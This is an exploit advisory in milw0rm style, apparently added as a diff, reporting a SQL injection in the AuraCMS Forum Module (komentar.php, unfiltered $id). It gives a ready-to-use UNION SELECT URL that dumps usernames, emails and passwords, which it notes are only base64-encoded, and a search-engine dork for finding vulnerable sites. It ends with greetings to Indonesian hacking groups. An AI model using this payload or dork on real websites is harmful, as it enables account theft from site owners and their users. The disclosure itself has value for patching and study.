@@ -1,0 +1,47 @@
+########################################################################
+# AuraCMS [Forum Module] - Remote SQL Injection
+# Vendor        : http://auracms.org/
+# Download      : http://iwan.or.id/redirect/download/36.html <-- Forum Module
+# Found By      : k1tk4t - k1tk4t[4t]newhack.org
+# Location      : Indonesia   --  #newhack[dot]org @irc.dal.net
+# Dork          : inurl:"?pilih=forum"
+########################################################################
+file;
+/forum/komentar.php
+
+bug at line27-29;
+select topikid, subjek, pengirim,reply, waktu, isi from ".$prefix."forum_topik where topikid=$id");
+
+Variable $id tidak terfilter dengan baik sehingga bisa di manipulasi oleh user melalui browser
+########################################################################
+
+exploit;
+http://localhost/AuraCMS/?pilih=forum&mod=yes&aksi=komentar&id=-9%20union%20select%201,user,id,4,email,password%20from%20user/*
+
+Password dalam bentuk "base64_encode"
+
+########################################################################
+Thanks;
+str0ke
+xoron,
+y3dips[y3d1ps.blogspot.com],
+mathdule
+iFX,x-ace,nyubi,
+dan semua temen2 komunitas security&hacking
+-----------------------
+-newhack[dot]org|staff-
+mR.opt1lc,fusion,fl3xu5,PusHm0v,Ghoz,bius,iind_id,slackX
+-----------------------
+all member newhack[ot]org
+-----------------------
+all member echo.or.id
+-----------------------
+all member www.yogyafree.net
+-----------------------
+all member www.sekuritionline.net
+-----------------------
+all member www.kecoak-elektronik.net
+-----------------------
+semua komunitas hacker&security Indonesia
+
+# milw0rm.com [2007-08-05]
